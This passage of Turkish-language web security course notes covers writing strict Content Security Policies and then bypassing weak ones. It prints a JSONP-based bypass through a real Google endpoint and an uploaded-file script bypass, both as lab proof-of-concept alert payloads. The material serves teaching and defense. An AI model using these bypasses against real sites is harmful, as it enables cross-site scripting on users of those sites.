- **`sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d`**: Bir öğeye hash ile izin verilir
- **`nonce-S0meR4nd0mN0nC3`**: Bir öğeye nonce ile izin verilir

Ek CSP yönerge değerleri için burada verilen [listeye](https://content-security-policy.com/#source_list) göz atın.

## Secure CSPs

CSP'yi mümkün olduğunca katı hale getirmek bir web uygulamasının güvenliğini sağlamak için çok önemlidir. Bu, katı bir temel CSP'den başlayarak ve web uygulaması amaçlandığı gibi çalışana kadar kısıtlamaları kademeli olarak gevşeterek başarılabilir. İyi bir temel CSP aşağıdaki gibidir:

```http
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

Bu CSP yalnızca aynı orginden görüntülerin, stil sayfalarının ve komut dosyalarının yüklenmesine izin verir, yalnızca JavaScript ve form gönderimlerinden aynı orgine HTTP isteklerine izin verir, yalnızca aynı orginin web sayfasını frame etmesine izin verir ve başka herhangi bir kaynağın yüklenmesini engeller. Herhangi bir harici kaynak kullanılıyorsa CSP'nin buna göre ayarlanması gerekir.

Ek olarak, web uygulamasının kullandığı satır içi JavaScript kodu, engellenmesini önlemek için kaldırılmalıdır. Bu, bir script dosyasına taşınarak ve yüklenerek kolayca gerçekleştirilebilir. Örneğin, aşağıdaki satır içi JavaScript kodunu düşünün:

```html
<script>
var poc = "test";
function submitForm(){
	console.log(poc);
}
</script>

<button id="submit" onclick="submitForm()">
```

Bu, aşağıdaki içeriğe sahip bir test.js dosyası oluşturmakla fonksiyonel olarak aynıdır:

```js
var poc = "test";
function submitForm(){
	console.log(poc);
}

document.getElementById("submit").addEventListener('click', submitForm);
```

Ve ardından komut dosyasını yükleyin:

```html
<script src=""/test.js"></script>
```

Bu şekilde, tüm satır içi JavaScript kodu kaldırılabilir.

Bizim için bir CSP'yi değerlendirmek üzere Google tarafından sağlanan [CSP Değerlendiricisi](https://csp-evaluator.withgoogle.com/) gibi mevcut çevrimiçi araçları kullanabiliriz. Güvenli bir CSP'nin nasıl yazılacağı hakkında daha fazla bilgi için [OWASP CSP Cheat Sheet'e](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html) göz atın.


# Bypassing Weak CSPs

CSP'ler, CSP yönergeleri ve CSP yönerge değerlerinden bahsettiğimize göre, şimdi zayıf CSP'lerden faydalanma ve bunları atlatma konusuna geçelim.

## Bypassing Weak CSPs

CSP'ler, XSS güvenlik açıklarını önlemek için derinlemesine bir savunma önlemi eklemek için kullanılabilir. Ancak, bir web uygulamasının CSP uygulaması otomatik olarak tüm XSS saldırılarına karşı korunduğu anlamına gelmez. CSP zayıfsa, onu atlamak mümkün olabilir. Bu nedenle, bir web uygulamasının CSP'sini potansiyel bypass'lara karşı analiz etmek çok önemlidir.

Aşağıdaki CSP'ye bakarak başlayalım:

```http
Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; font-src *; script-src 'self' https://*.google.com;
```

Bu CSP, görüntülerin kaynağın kendisinden, stillerin ve yazı tiplerinin herhangi bir yerden, komut dosyalarının kaynağın kendisinden ve google.com'un herhangi bir subdomainlerden  yüklenmesine izin verir. Diğer tüm kaynaklar default-src 'none' yönergesi nedeniyle yüklenemez.

Bir kavram kanıtı olarak web uygulamasına basit bir uyarı açılır penceresi enjekte etmeyi denediğimizi varsayalım:

```html
<script>alert(1)</script>
```

CSP nedeniyle, uyarı açılır penceresi gösterilmez; bunun yerine, tarayıcının JavaScript konsolu aşağıdaki hata mesajını yazdırır:

```html
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'self' https://*.google.com". Either the 'unsafe-inline' keyword, a hash ('sha256-bhHHL3z2vDgxUt0W3dWQOrprscmda2Y5pLsLg4GF+pI='), or a nonce ('nonce-...') is required to enable inline execution
```

Bu savunma tekniği ilk bakışta güvenli görünse de, JSONP ile atlatılabilir. [JSONP](https://www.w3schools.com/js/js_json_jsonp.asp), Same-Origin politikası nedeniyle sorun yaşamadan farklı originler arasında veri alan bir tekniği ifade eder. JSONP'nin temel fikri, Same-Origin politikasından hariç tutuldukları için originler arasında veri almak için script tag'lerini kullanmaktır. Örneğin, bir web uygulamasının http://vulnerablesite.htb aşağıdaki JSON verilerini döndüren http://someapi.htb/stats endpoint'inden veri almak istediğini varsayalım:

```json
{'clicks': 1337}
```

API'de CORS yapılandırılmamışsa web uygulaması, Same-Origin ilkesi nedeniyle cross origin isteğine verilen yanıta erişemez. Ancak, script etiketleri Same-Origin politikasının dışında tutulduğundan, web uygulaması sayfasında aşağıdaki HTML tag'ini kullanarak verileri yükleyebilir:

```html
<script src=""http://someapi.htb/stats"></script>
```

Şimdi, web uygulamasının verileri bir şekilde işlemesi gerektiğinden, bu tek başına pratik değildir. Web uygulamasının bu amaçla processData adında bir fonksiyon kullandığını varsayalım. Ancak bu haliyle, alınan veriyi bu fonksiyona aktarmanın bir yolu yoktur. İşte burada JSONP devreye giriyor. API JSONP'yi destekliyorsa, veriyi gönderen endpoint üzerinde bir GET parametresi okuyacak ve yanıtı buna göre ayarlayacaktır. Bu parametre genellikle callback olarak adlandırılır. http://someapi.htb/stats?callback=processData endpoint'ini çağırdığımızı varsayalım. Bu, API'nin aşağıdaki yanıtı göndermesiyle sonuçlanır:

```js
processData({'clicks': 1337})
```

Web uygulaması artık sayfasına aşağıdaki kod tag'ini ekleyebilir:

```html
<script src=""http://someapi.htb/stats?callback=processData"></script>
```

Bu, web uygulamasının processData fonksiyonunun, Same-Origin politikasını veya CORS ihtiyacını ihlal etmeden API'den cross-origin olarak getirilen veriler üzerinde çağrılmasıyla sonuçlanır.

JSONP endpoint'leri, arayanın çağrılacak bir fonksiyon belirtmesine izin verdiğinden, JSONP endpoint'ini sunan domain tarafından gönderilen JavaScript kodunu dinamik olarak oluşturmak için kullanılabilirler. Bu nedenle JSONP, CSP'leri atlamak için kullanılabilir. Google birden fazla farklı JSONP endpoint sunmaktadır. JSONBee GitHub deposu, CSP'leri atlamak için kullanılabilecek birçok JSONP endpoint'ini listeler. Yukarıdaki CSP'yi atlamak için aşağıdaki Google JSONP endpoint'ini kullanabiliriz:

```html
<script src=""https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
```

Bu girdiyi ziyaretçi defterine göndererek uyarı açılır penceresi tetiklenir ve böylece CSP atlanır:

![Pasted image 20241217222939.png](/img/user/resimler/Pasted%20image%2020241217222939.png)

Bir diğer yaygın zayıflık ise 'self' değerinin otomatik olarak güvenli olduğu varsayımıdır. Örneğin, aşağıdaki CSP'yi düşünün:

```http
Content-Security-policy: default-src 'none'; img-src 'self'; style-src *; script-src 'self';
```

Bu kez, komut dosyaları yalnızca kaynağın kendisinden yüklenebilir. Kaynağın bir JSONP endpoint'i sunmadığını varsayarsak, bu güvenli görünüyor. Ancak, bir web uygulamasının kullanıcıların dosya yüklemesine izin verdiği bir senaryo düşünün. Rastgele dosya türlerine izin veriliyorsa, bir saldırgan bir .js dosyası yükleyebilir. Bu durumda, yüklenen payload'u kaynağın kendisinden yükleyerek bir XSS'den faydalanmak mümkündür:

```html
<script src=""/uploads/avatag.jpg.js"></script>
```

Genel olarak, bir CSP'nin değerlendirilmesi somut CSP'nin kendisine ve web uygulamasının fonksiyonelliğine bağlıdır. Gördüğümüz gibi, script-src yönergesini 'self' olarak ayarlamak, web uygulaması bir dosya yükleme fonksiyonu uyguluyorsa güvensiz olabilir. Bu nedenle, CSP'yi uygulandığı somut web uygulaması contex'inde değerlendirmek çok önemlidir.
